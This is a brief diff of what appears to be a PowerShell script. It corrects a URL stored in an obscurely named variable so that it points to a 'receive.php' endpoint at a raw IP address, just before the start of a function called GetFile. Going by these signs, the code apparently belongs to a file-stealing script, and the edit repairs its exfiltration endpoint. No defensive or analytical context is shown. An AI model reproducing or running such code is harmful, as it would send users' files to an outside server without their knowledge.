@@ -1,4 +1,4 @@
-$srsdf='http://http://38.180.137.24//receive.php' 
+$srsdf='http://38.180.137.24/receive.php' 
 
 function GetFile() {
 	param (
